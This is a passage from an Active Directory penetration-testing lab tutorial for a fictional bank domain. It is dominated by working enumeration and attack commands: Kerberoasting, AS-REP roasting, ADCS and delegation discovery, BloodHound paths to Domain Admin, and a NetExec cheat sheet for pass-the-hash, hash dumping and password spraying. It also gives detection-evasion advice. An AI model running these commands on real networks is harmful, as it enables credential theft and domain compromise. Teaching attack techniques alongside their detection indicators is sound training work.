  -b "DC=orsubank,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" \
  sAMAccountName memberOf description title department
```

**Breaking down this command:**

| Part | What It Does |
|:-----|:-------------|
| `-x` | Use simple authentication (not SASL) |
| `-H ldap://<DC_IP>` | Connect to the DC on port 389 |
| `-D "vamsi.krishna@orsubank.local"` | Authenticate as this user (the "bind DN") |
| `-w 'OrsUBank2024!'` | The password (single quotes to protect the `!`) |
| `-b "DC=orsubank,DC=local"` | Start searching from the domain root (the "search base") |
| `"(&(objectCategory=person)(objectClass=user))"` | The LDAP filter: find objects that are both "person" category AND "user" class |
| `sAMAccountName memberOf ...` | Only return these specific attributes (instead of everything) |

```bash
# Find accounts with SPNs (Kerberoastable targets)
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

This finds every user account that has a Service Principal Name set. These are the accounts you can Kerberoast (request a service ticket encrypted with their password hash, then crack it offline). In our lab, you should find: `sqlservice`, `httpservice`, `iisservice`, and `backupservice`.

```bash
# Find accounts without Kerberos pre-authentication (AS-REP Roastable)
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

**What is that weird `1.2.840.113556.1.4.803` thing?** It is an LDAP matching rule OID (Object Identifier) that means "bitwise AND." The `userAccountControl` attribute is a bitmask where each bit represents a flag. The value `4194304` is the bit for "Do Not Require Pre-Authentication." This filter finds accounts where that specific bit is set.

You do not need to memorize this. Just understand that LDAP can check individual flags within bitmask attributes. This is how tools like BloodHound and NetExec find AS-REP Roastable accounts internally.

```bash
# Find all computers with their OS information
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(objectCategory=computer)" \
  cn operatingSystem operatingSystemVersion
```

```bash
# Find domain password policy
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" -s base \
  "(objectClass=*)" \
  minPwdLength maxPwdAge lockoutThreshold lockoutDuration pwdHistoryLength
```

> **Protocol used:** LDAP (port 389)
> **What defenders see:** LDAP queries to the DC. Not individually logged by default. If Event ID 1644 (Expensive LDAP Queries) logging is enabled via registry, broad recursive searches may be captured. Standard targeted queries are invisible.

---

## Part 5: Finding Attack Paths (Deep Enumeration)

Parts 3 and 4 gave you the lay of the land. You know who exists, what groups there are, what shares are accessible, and where the DCs are. Now it is time to dig deeper and find specific vulnerabilities. Each exercise in this section targets a specific attack class that exists in our lab.

### Lab Exercise 12: Kerberoasting Discovery

Kerberoasting is one of the most reliable attack techniques in Active Directory. Here is why it works:

1. When a service runs under a domain account (like a SQL Server running as `sqlservice@orsubank.local`), the administrator registers a Service Principal Name (SPN) on that account. The SPN tells Kerberos "this account runs this service."

2. Any authenticated domain user can request a Kerberos service ticket (TGS) for any service with an SPN. This is completely normal behavior. Your browser does this when you access an internal web app. Your mail client does this when it connects to Exchange. It is how Kerberos works.

3. The service ticket is encrypted with the service account's password hash. This is by design, because the service needs to decrypt it to validate your identity.

4. The attacker requests these tickets, saves them, and cracks them offline. If the service account has a weak password (which is very common because service account passwords are often set once and never changed), the attacker recovers the plaintext password.

The key insight: the attacker never interacts with the service itself. They just ask the KDC for a ticket and then crack it on their own machine. There is no failed login attempt. There is no connection to the service. The only evidence is a Kerberos TGS-REQ on the domain controller.

```bash
# Find Kerberoastable accounts and extract their ticket hashes
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --kerberoasting kerb_hashes.txt
```

**Expected result:** NetExec queries LDAP for all user accounts with SPNs set, then requests a service ticket (TGS) for each one from the KDC. The encrypted tickets are saved to `kerb_hashes.txt` in a format that Hashcat or John the Ripper can crack.

In our lab, you should find these Kerberoastable accounts:

| Account | SPN | What It Pretends to Be |
|:--------|:----|:----------------------|
| `sqlservice` | `MSSQLSvc/DC01.orsubank.local:1433` | SQL Server database engine |
| `httpservice` | `HTTP/web.orsubank.local` | Web application service |
| `iisservice` | `HTTP/app.orsubank.local` | IIS application pool |
| `backupservice` | `MSSQLSvc/DC01.orsubank.local:1434` | Database backup agent |

```bash
# Check the extracted hashes
cat kerb_hashes.txt
```

Each line contains a hash in the format `$krb5tgs$23$*accountname$domain$...`. The `23` means RC4 encryption (etype 23), which is the weakest and fastest to crack. We will crack these in Module 04.

> **Protocol used:** LDAP (port 389) for finding SPNs, then Kerberos (port 88) for requesting service tickets
> **What defenders see:** Event ID 4769 (Kerberos Service Ticket Request) on the DC for each ticket requested. If the encryption type is RC4 (etype 0x17), this is a high-fidelity indicator of Kerberoasting. Microsoft Defender for Identity (MDI) specifically alerts on this pattern (Alert ID 2410).

### Lab Exercise 13: AS-REP Roasting Discovery

AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled. Remember from Part 2: normally when you authenticate, you must encrypt a timestamp with your password hash to prove you know the password. This is pre-authentication.

Some accounts have this requirement disabled (the "Do not require Kerberos preauthentication" flag). This is sometimes done for compatibility with older applications or Linux systems. When pre-auth is disabled, anyone can send an AS-REQ for that account with just the username, and the KDC will respond with data encrypted using the user's password hash. No valid credentials needed to perform the request (though having credentials helps for authenticated LDAP discovery).

```bash
# Find AS-REP Roastable accounts and extract hashes
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --asreproast asrep_hashes.txt
```

In our lab, you should find these accounts with pre-auth disabled:

| Account | Title | Password |
|:--------|:------|:---------|
| `pranavi` | Branch Manager | `Branch123!` |
| `harsha.vardhan` | Customer Service Manager | `Customer2024!` |
| `kiran.kumar` | Financial Analyst | `Finance1!` |

```bash
# Check the extracted hashes
cat asrep_hashes.txt
```

Each line contains a hash in the format `$krb5asrep$23$accountname@DOMAIN...`. We will crack these in Module 04.

**Kerberoasting vs AS-REP Roasting comparison:**

| Aspect | Kerberoasting | AS-REP Roasting |
|:-------|:-------------|:----------------|
| Requires valid domain credentials? | Yes (to query LDAP and request TGS) | No (but helps for discovery via LDAP) |
| What gets cracked? | Service ticket (TGS) | Authentication reply (AS-REP) |
| Targets | Service accounts with SPNs | User accounts without pre-auth |
| Typical password strength | Weak (service accounts rarely change passwords) | Varies (could be strong or weak) |
| Detection | Event ID 4769 with RC4 encryption | Event ID 4768 without pre-auth data |

> **Protocol used:** LDAP (port 389) for discovery, Kerberos (port 88) for AS-REQ/AS-REP
> **What defenders see:** Event ID 4768 (Kerberos TGT Request) on the DC. AS-REP Roasting requests are distinguishable because they lack pre-authentication data.

### Lab Exercise 14: ADCS Discovery

Active Directory Certificate Services (ADCS) is a Windows feature that lets organizations run their own Certificate Authority (CA). Think of it as the company's own SSL certificate factory. Employees, computers, and services can request certificates for authentication, email encryption, code signing, and more.

The problem is that ADCS is notoriously difficult to configure securely. Misconfigurations in certificate templates can allow a regular user to request a certificate as a Domain Admin, effectively giving them full domain control.

```bash
# Discover Certificate Authority servers and templates
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M adcs
```

In our lab, you should see DC01 running a Certificate Authority called `orsubank-DC01-CA`. The lab has three intentional misconfigurations:

**ESC1 (SAN Abuse):** A template allows the requester to specify a Subject Alternative Name (SAN). This means you can request a certificate and put `Administrator@orsubank.local` in the SAN field. The CA will issue it, and you can use that certificate to authenticate as Administrator.

**ESC4 (Template Write):** A template has permissions that allow a low-privilege user to modify the template itself. You can modify the template to enable ESC1 conditions, then exploit ESC1.

**ESC8 (NTLM Relay to Web Enrollment):** The CA has a web enrollment page accessible over HTTP (not HTTPS). You can relay NTLM authentication to this page and request a certificate as the relayed user.

For deeper ADCS enumeration, we will use Certipy in later modules:

```bash
# If certipy is installed, use it for detailed template analysis
certipy find -u 'vamsi.krishna@orsubank.local' -p 'OrsUBank2024!' -dc-ip <DC_IP> -vulnerable -stdout
```

> **Protocol used:** LDAP (port 389) to query the Configuration naming context for CA and template objects
> **What defenders see:** LDAP queries to the configuration partition are standard and not logged. By default, ADCS auditing is DISABLED. This means ADCS enumeration is very quiet. Certificate issuance is logged only if auditing is explicitly enabled (Event IDs 4886/4887).

### Lab Exercise 15: Delegation Discovery

Kerberos delegation allows a service to act on behalf of a user. Think of it like this: you give a travel agent (the service) permission to book flights and hotels (other services) on your behalf, using your identity.

There are three types of delegation, and all three can be abused:

**Unconstrained Delegation:** The service can impersonate you to ANY other service. If you authenticate to a machine with unconstrained delegation, your TGT (your master authentication ticket) gets cached on that machine. An attacker who compromises that machine can steal your TGT and impersonate you to anything in the domain.

**Constrained Delegation:** The service can only impersonate you to specific pre-approved services. Less dangerous than unconstrained, but still abusable with Kerberos protocol extensions (S4U2Self, S4U2Proxy).

**Resource-Based Constrained Delegation (RBCD):** Instead of the service saying "I can delegate to these targets," the target says "these services can delegate to me." This is exploitable if an attacker can modify the target's RBCD configuration.

```bash
# Find accounts with unconstrained delegation
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" \
  sAMAccountName
```

The filter `524288` is the bit for "Trusted For Delegation" (unconstrained). We exclude `8192` (Server Trust Account) because domain controllers always have unconstrained delegation by design, and that is not a finding.

In our lab, **WS01** should appear as having unconstrained delegation.

```bash
# Find accounts with constrained delegation
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo
```

This finds accounts that have a list of services they are allowed to delegate to. The `msDS-AllowedToDelegateTo` attribute contains those target SPNs.

```bash
# Find RBCD configurations
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
  -b "DC=orsubank,DC=local" \
  "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
  sAMAccountName
```

You can also use Impacket's `findDelegation.py` tool for a cleaner view:

```bash
# Comprehensive delegation discovery with Impacket
findDelegation.py 'orsubank.local/vamsi.krishna:OrsUBank2024!' -dc-ip <DC_IP>
```

This shows all three delegation types in one output.

> **Protocol used:** LDAP (port 389) for querying UAC flags and delegation attributes
> **What defenders see:** Standard LDAP queries. Not individually logged.

### Lab Exercise 16: Check Where You Have Local Admin

This is one of the most important checks. If your compromised user has local administrator access on any machine, you can dump credentials from that machine and potentially escalate further.

```bash
# Check all hosts on the subnet for local admin access
nxc smb <SUBNET>.0/24 -u 'vamsi.krishna' -p 'OrsUBank2024!'
```

Look for `(Pwn3d!)` in the output. That tag means local admin access is confirmed.

For `vamsi.krishna`, you should NOT see `(Pwn3d!)` on any host. He is a standard domain user with no admin privileges. But in a real engagement, it is common to find users who are local admins on specific workstations or servers, especially in organizations that do not use LAPS (Local Administrator Password Solution).

### Lab Exercise 17: Enumerate AV/EDR on Targets

Before you attempt any exploitation, you need to know what security software is running on your targets. This determines what tools you can use and what evasion techniques you need.

```bash
# Check what AV/EDR is running on DC01
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M enum_av

# Check WS01
nxc smb <WS_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M enum_av
```

In our lab, Windows Defender is disabled on both machines (the setup script turned it off). In a real engagement, you might see:
- Windows Defender
- CrowdStrike Falcon
- SentinelOne
- Carbon Black
- Cortex XDR
- Microsoft Defender for Endpoint

Knowing the defensive stack helps you choose tools that are less likely to be detected.

> **Protocol used:** SMB (port 445) with WMI or registry queries
> **What defenders see:** Event ID 4624 (Network Logon) and possibly WMI query events.

---

## Part 6: BloodHound (Graph-Based Attack Path Analysis)

Everything you have done so far in this module, all those LDAP queries, share enumerations, user lookups, gives you pieces of a puzzle. BloodHound assembles the entire puzzle at once and shows you paths you could never find manually.

### Why BloodHound Exists

Consider this scenario from our lab: `vamsi.krishna` has GenericAll over `lakshmi.devi`. `lakshmi.devi` is not a Domain Admin. But `lakshmi.devi` has some permission over another user, who is in a group, that is nested inside another group, that eventually leads to Domain Admins.

You could spend hours manually tracing group memberships, ACL permissions, and delegation configurations. Or you could let BloodHound build a graph of every object and every relationship in the domain, then ask it: "What is the shortest path from vamsi.krishna to Domain Admins?"

BloodHound was created by SpecterOps (Andy Robbins, Rohan Vazarkar, Will Schroeder). It changed Active Directory pentesting forever because it made invisible attack paths visible.

### Step 1: Install BloodHound Python Collector

We collect data from Kali using `bloodhound-python`. This is the Python-based collector that queries AD remotely. No tools need to be dropped on any Windows host.

```bash
# Install bloodhound-python (for legacy BloodHound)
pip install bloodhound

# Verify installation
bloodhound-python --help
```

If you want to use BloodHound CE (the newer web-based version), install the CE-compatible collector instead:

```bash
pip install bloodhound-ce-python
```

### Step 2: Collect Data

The collector queries Active Directory and exports JSON files containing all the relationships BloodHound needs.

**Option A: DCOnly collection (Stealthiest)**

```bash
bloodhound-python -u 'vamsi.krishna' -p 'OrsUBank2024!' \
  -d orsubank.local -ns <DC_IP> -c DCOnly
```

DCOnly means the collector only queries domain controllers via LDAP. It does NOT connect to individual workstations or servers. This collects:
- All users, groups, computers, OUs, and GPOs
- All group memberships (including nested)
- All ACLs/DACLs on AD objects
- Domain trust relationships
- Object properties (password last set, last logon, etc.)

What it does NOT collect (because it does not touch endpoints):
- Active user sessions (who is logged into which computer right now)
- Local administrator group memberships on individual machines

**Option B: All collection (Most Comprehensive)**

```bash
bloodhound-python -u 'vamsi.krishna' -p 'OrsUBank2024!' \
  -d orsubank.local -ns <DC_IP> -c All
```

This collects everything from DCOnly PLUS session data and local admin memberships from every reachable computer. In our small lab with 2 machines, this is fast and fine. In a real network with 5,000 computers, this sends SMB connections to every single one.

**OPSEC comparison:**

| Method | Touches Endpoints? | Network Noise | Data Completeness |
|:-------|:-------------------|:-------------|:-----------------|
| DCOnly | No (DCs only) | Low | Good (missing sessions/local admins) |
| All | Yes (every host) | High | Complete |

For this lab, use `All` since we want the most data and there are only 2 machines.

```bash
# Collect all data
bloodhound-python -u 'vamsi.krishna' -p 'OrsUBank2024!' \
  -d orsubank.local -ns <DC_IP> -c All
```

After collection, you will see several JSON files in your current directory:

```bash
ls *.json
# Expected: computers.json, users.json, groups.json, domains.json, etc.
```

### Step 3: Import Data into BloodHound

**For BloodHound Legacy (Electron app):**

1. Start Neo4j: `sudo neo4j start`
2. Open BloodHound: `bloodhound`
3. Log in with your Neo4j credentials (default: neo4j/neo4j, you will be asked to change it on first use)
4. Click the "Upload Data" button (up arrow icon) on the right side
5. Select all the JSON files from your collection
6. Wait for import to complete

**For BloodHound CE (Docker-based web app):**

1. Start BloodHound CE: `./bh-cli start` (or `docker-compose up`)
2. Open your browser to `http://localhost:8080`
3. Log in with the initial credentials shown during setup
4. Go to the file ingest page and upload the JSON files

### Step 4: Mark Owned Principals

Before running queries, tell BloodHound which accounts you control. Right-click on `vamsi.krishna@orsubank.local` and mark it as "Owned." This lets BloodHound calculate paths from your starting position.

### Step 5: Find Attack Paths

Here are the key queries to run. In BloodHound Legacy, use the "Pre-Built Analytics" tab or the raw Cypher query bar.

**Query 1: "Shortest Paths to Domain Admins from Owned Principals"**

This is the most important query. It shows you every path from vamsi.krishna to Domain Admins. In our lab, you should see multiple paths:

1. **ACL path via GenericAll:** vamsi.krishna has GenericAll over lakshmi.devi. From lakshmi.devi, there may be further ACL abuse paths.

2. **ACL path via WriteDACL:** vamsi.krishna has WriteDACL on the IT_Admins group. IT_Admins is a member of Domain Admins. So vamsi.krishna can modify the DACL on IT_Admins, grant himself the ability to add members, add himself to IT_Admins, and become a Domain Admin.

3. **Nested group chain:** harsha.vardhan (AS-REP Roastable, crackable password) is in HelpDesk_Team, which is in IT_Support, which is in Server_Admins, which is in Domain Admins. Crack harsha.vardhan's password and you are a Domain Admin through nested group membership.

4. **GenericWrite to Kerberoast:** vamsi.krishna has GenericWrite over sai.kiran. GenericWrite lets you set an SPN on sai.kiran's account (targeted Kerberoasting), request a service ticket, crack it, and use sai.kiran's account.

5. **ForceChangePassword chain:** divya has ForceChangePassword over ammulu.orsu, who is a Domain Admin. If you can get to divya's account, you can reset ammulu.orsu's password and take over a DA account directly.

**Query 2: "Find All Kerberoastable Users"**

Shows every account with an SPN. Cross-reference with the hashes you extracted in Exercise 12.

**Query 3: "Find Principals with DCSync Rights"**

DCSync is the ability to replicate AD data (including password hashes) from a domain controller. This query shows who can perform a DCSync attack. In our lab, WS01's machine account has replication rights.

**Custom Cypher queries (type these in the query bar):**

```cypher
// All users with a path to Domain Admins (any length)
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@ORSUBANK.LOCAL'}))
RETURN p
```

```cypher
// Kerberoastable users who have a path to DA
MATCH (u:User {hasspn:true})
MATCH (g:Group {name:'DOMAIN ADMINS@ORSUBANK.LOCAL'})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN u.name, LENGTH(p) AS hops
ORDER BY hops ASC
```

```cypher
// Find who has DCSync rights
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name
```

### What BloodHound Reveals in Our Lab

Here is a summary of the attack paths BloodHound should reveal:

| Attack Path | How It Works | Difficulty |
|:-----------|:-------------|:-----------|
| WriteDACL on IT_Admins | Modify DACL, add self to group, become DA | Easy |
| GenericAll on lakshmi.devi | Full control over lakshmi.devi (reset password, set SPN) | Easy |
| GenericWrite on sai.kiran | Set SPN, Kerberoast, crack password | Medium |
| ForceChangePassword: divya to ammulu.orsu | Need to compromise divya first, then reset DA password | Medium |
| Nested groups via harsha.vardhan | AS-REP Roast harsha.vardhan, crack password, he is indirectly DA | Easy |
| RBCD on WS01 | vamsi.krishna can write RBCD config on WS01 | Medium |
| DCSync via WS01$ | WS01 machine account has replication rights | Requires WS01 compromise |

> **Protocol used:** LDAP (port 389) for DCOnly collection. LDAP + SMB (port 445) + RPC for All collection.
> **What defenders see:** DCOnly generates LDAP query volume to DCs. All collection generates Event ID 4624 on every contacted host, plus SMB/RPC traffic to every machine. Microsoft Defender for Identity (MDI) has specific detections for SharpHound and bloodhound-python LDAP query patterns.

---

## Part 7: Know Your Footprint (What Defenders See)

You have just enumerated the entire domain. You found users, groups, shares, Kerberoastable accounts, AS-REP Roastable accounts, delegation configurations, certificate services, and BloodHound attack paths. That is a lot of activity.

Now ask yourself: if you were the defender, what would you have seen?

### Every Action Leaves a Trace

Here is a breakdown of every exercise you performed and what it generated:

| Exercise | What You Did | Event ID Generated | Where |
|:---------|:-------------|:-------------------|:------|
| 1. Credential test | SMB authentication to DC01 | 4624 (Type 3) | DC01 Security log |
| 2. DNS recon | DNS SRV queries | None (standard DNS) | DNS query logs if enabled |
| 3. Password policy | SAMR query via SMB | 4624 (Type 3) | DC01 Security log |
| 4. Null sessions | Anonymous SMB attempt | 4625 (Failed Logon) | DC01 Security log |
| 5. Host discovery | SMB probes to subnet | 4624 on each responding host | Each host's Security log |
| 6. User enumeration | LDAP query to DC | Not logged by default | DC01 (Event 1644 if configured) |
| 7. Group enumeration | LDAP query to DC | Not logged by default | DC01 (Event 1644 if configured) |
| 8. Computer enumeration | LDAP query to DC | Not logged by default | DC01 (Event 1644 if configured) |
| 9. Share enumeration | SMB connections | 4624 + 5140 (if audited) | Target host |
| 10. Session hunting | SMB/RPC connections | 4624 on each host | Each contacted host |
| 11. Manual LDAP | LDAP queries to DC | Not logged by default | DC01 |
| 12. Kerberoasting | LDAP + Kerberos TGS-REQ | 4769 (with etype 0x17) | DC01 Security log |
| 13. AS-REP Roasting | LDAP + Kerberos AS-REQ | 4768 (no pre-auth) | DC01 Security log |
| 14. ADCS discovery | LDAP query to config partition | Not logged | DC01 |
| 15. Delegation discovery | LDAP queries | Not logged by default | DC01 |
| 16. Local admin check | SMB authentication sweep | 4624 on each host | Each host's Security log |
| 17. AV enumeration | SMB + WMI queries | 4624 + WMI events | Target host |
| BloodHound (DCOnly) | Bulk LDAP queries | 1644 (if configured) | DC01 |
| BloodHound (All) | LDAP + SMB/RPC to all hosts | 4624 everywhere + 1644 | DC01 + every host |

### The Highest-Risk Activities

Not all enumeration is equally detectable. Here is what would most likely trigger an alert in a mature environment:

**1. Kerberoasting (HIGH RISK)**
Event ID 4769 with RC4 encryption (etype 0x17) is one of the highest-fidelity detection signals in AD security. Microsoft Defender for Identity (MDI) has a specific alert for this. If the organization uses MDI, your Kerberoasting will be flagged within minutes.

**2. BloodHound All Collection (HIGH RISK)**
Connecting to every machine on the network via SMB in rapid succession is very unusual behavior for a regular user account. EDR solutions and network monitoring tools flag this pattern. MDI also detects the characteristic LDAP query patterns from bloodhound-python and SharpHound.

**3. SMB Subnet Sweep (MODERATE RISK)**
Probing the entire /24 subnet via SMB is unusual for a Bank Manager's account. Behavioral analytics (UEBA) might flag this as anomalous activity.

**4. Multiple Failed Null Session Attempts (LOW RISK)**
A few failed anonymous logins might generate Event ID 4625 entries, but these are common noise in most environments.

**5. LDAP Queries (LOW RISK)**
Standard LDAP queries are baseline AD traffic. Applications, management tools, and services make LDAP queries constantly. Unless the organization has enabled expensive query logging (Event ID 1644) or uses MDI, your LDAP enumeration is invisible.

### How to Be Quieter

If this were a real engagement where stealth matters, here is how you would reduce your footprint:

1. **Use LDAP over SMB whenever possible.** LDAP queries to DCs are baseline traffic. SMB connections to workstations are not.

2. **Use DCOnly for BloodHound.** You lose session and local admin data, but you eliminate all endpoint contact.

3. **Target specific hosts, not entire subnets.** Instead of `nxc smb <SUBNET>.0/24`, query only the hosts you care about.

4. **Space out your activities.** Do not run all 17 exercises in 5 minutes. Spread enumeration over hours or days.

5. **Operate during business hours.** LDAP traffic at 3 AM from a Bank Manager's account is suspicious. The same traffic at 10 AM is normal.

6. **Use Kerberos authentication when possible.** NTLM authentication generates more visible log entries (4625 on failures) than Kerberos.

7. **Check the password policy before spraying.** This was Exercise 3 for a reason.

---

## Summary: What We Found

Here is everything we discovered during our enumeration of the orsubank.local domain:

### Domain Overview

| Item | Value |
|:-----|:------|
| Domain | orsubank.local |
| Domain Controller | DC01 (Windows Server 2022) |
| Workstation | WS01 (Windows 10/11) |
| Total Users | 10 employees + 4 service accounts |
| Domain Admins | ammulu.orsu (direct), harsha.vardhan (nested chain) |
| Certificate Authority | orsubank-DC01-CA on DC01 |

### Attack Vectors Discovered

| Finding | Type | Severity |
|:--------|:-----|:---------|
| 4 Kerberoastable service accounts | Credential Access | High |
| 3 AS-REP Roastable user accounts | Credential Access | High |
| GenericAll: vamsi.krishna over lakshmi.devi | ACL Misconfiguration | Critical |
| WriteDACL: vamsi.krishna over IT_Admins (member of DA) | ACL Misconfiguration | Critical |
| GenericWrite: vamsi.krishna over sai.kiran | ACL Misconfiguration | High |
| ForceChangePassword: divya over ammulu.orsu (DA) | ACL Misconfiguration | Critical |
| Nested group chain to DA (4 levels deep) | Group Misconfiguration | High |
| Unconstrained Delegation on WS01 | Delegation Misconfiguration | High |
| RBCD writable by vamsi.krishna on WS01 | Delegation Misconfiguration | High |
| DCSync rights on WS01$ machine account | Privilege Escalation | Critical |
| ADCS ESC1, ESC4, ESC8 misconfigurations | Certificate Abuse | Critical |
| SMB signing not enforced on WS01 | NTLM Relay Risk | Medium |
| Password policy: no account lockout | Weak Policy | Medium |

### What Comes Next

In Module 02, we will exploit these findings. We will start with local privilege escalation on WS01, then move to credential attacks (Kerberoasting, AS-REP Roasting), ACL abuse, delegation attacks, certificate abuse, and ultimately achieve Domain Admin through multiple different paths.

The goal is not just to reach DA once. It is to reach DA through every available path, understanding each attack technique deeply.

---

## Quick Reference: NetExec Cheat Sheet

```bash
# === AUTHENTICATION ===
nxc smb <IP> -u 'user' -p 'pass'                    # Test credentials
nxc smb <IP> -u 'user' -H '<NT_HASH>'               # Pass-the-Hash
nxc smb <IP> -u 'user' -p 'pass' --local-auth        # Local account auth

# === HOST DISCOVERY ===
nxc smb <SUBNET>/24                                   # Find SMB hosts (no auth)
nxc smb <SUBNET>/24 --gen-relay-list targets.txt       # Find relay targets

# === USER / GROUP / COMPUTER ===
nxc ldap <DC> -u 'user' -p 'pass' --users             # All domain users
nxc ldap <DC> -u 'user' -p 'pass' --active-users      # Enabled users only
nxc ldap <DC> -u 'user' -p 'pass' --groups            # All domain groups
nxc ldap <DC> -u 'user' -p 'pass' --computers         # All domain computers
nxc smb <DC> -u 'user' -p 'pass' --users              # Users via SAMR/SMB

# === SHARES ===
nxc smb <IP> -u 'user' -p 'pass' --shares             # List shares
nxc smb <IP> -u 'user' -p 'pass' -M spider_plus       # Spider shares for files

# === SESSIONS ===
nxc smb <IP> -u 'user' -p 'pass' --sessions           # Active SMB sessions
nxc smb <IP> -u 'user' -p 'pass' --loggedon-users     # Logged-on users

# === POLICY ===
nxc smb <DC> -u 'user' -p 'pass' --pass-pol           # Password policy

# === KERBEROS ATTACKS ===
nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting out.txt   # Kerberoast
nxc ldap <DC> -u 'user' -p 'pass' --asreproast out.txt      # AS-REP Roast

# === MODULES ===
nxc ldap <DC> -u 'user' -p 'pass' -M get-desc-users         # Passwords in descriptions
nxc ldap <DC> -u 'user' -p 'pass' -M groupmembership -o USER='target'  # Group check
nxc ldap <DC> -u 'user' -p 'pass' -M adcs                   # ADCS discovery
nxc smb <IP> -u 'user' -p 'pass' -M enum_av                 # AV/EDR detection

# === EXECUTION (requires admin) ===
nxc smb <IP> -u 'admin' -p 'pass' -x 'whoami'               # Run command via SMB
nxc winrm <IP> -u 'admin' -p 'pass' -x 'whoami'             # Run command via WinRM
nxc smb <IP> -u 'admin' -p 'pass' --sam                      # Dump local hashes
nxc smb <IP> -u 'admin' -p 'pass' --lsa                      # Dump LSA secrets

# === NULL SESSIONS ===
nxc smb <IP> -u '' -p '' --shares                             # Null session shares
nxc smb <IP> -u '' -p '' --pass-pol                           # Null session policy

# === PASSWORD SPRAYING (be careful) ===
nxc smb <DC> -u users.txt -p 'Password1!' --continue-on-success  # Spray one password
nxc smb <DC> -u users.txt -p passes.txt --no-bruteforce          # Paired user:pass
```

## Quick Reference: LDAP Filter Cheat Sheet

```
# All users
(&(objectCategory=person)(objectClass=user))

# All enabled users
(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# All computers
(objectCategory=computer)

# All groups
(objectCategory=group)

# Users with SPNs (Kerberoastable)
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))

# Users without pre-auth (AS-REP Roastable)
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Unconstrained delegation (excluding DCs)
(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))

# Constrained delegation
(msDS-AllowedToDelegateTo=*)

# RBCD configured
(msDS-AllowedToActOnBehalfOfOtherIdentity=*)

# AdminCount = 1 (privileged or formerly privileged)
(&(objectCategory=person)(objectClass=user)(adminCount=1))

# Password never expires
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))

# Disabled accounts
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

# Recursive group membership (e.g., all members of Domain Admins including nested)
(&(objectCategory=person)(objectClass=user)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=orsubank,DC=local))
```

## Quick Reference: BloodHound Cypher Queries

```cypher
// Shortest path from owned user to Domain Admins
MATCH (n:User {name:'VAMSI.KRISHNA@ORSUBANK.LOCAL'})
MATCH (g:Group {name:'DOMAIN ADMINS@ORSUBANK.LOCAL'})
MATCH p=shortestPath((n)-[*1..]->(g))
RETURN p

// All Kerberoastable users
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

// Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH (g:Group {name:'DOMAIN ADMINS@ORSUBANK.LOCAL'})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN u.name, LENGTH(p) AS hops
ORDER BY hops ASC

// Users with DCSync rights
MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name

// Users with GenericAll over other users
MATCH p=(u:User)-[:GenericAll]->(target:User)
RETURN p

// Users who can force-change passwords
MATCH p=(u:User)-[:ForceChangePassword]->(target:User)
RETURN p

// Users with WriteDACL on groups
MATCH p=(u:User)-[:WriteDacl]->(g:Group)
RETURN u.name, g.name
```

---

*Module 02: Local Privilege Escalation is next. You will exploit weak services, unquoted paths, and token abuse to escalate from a standard user to local admin on WS01.*

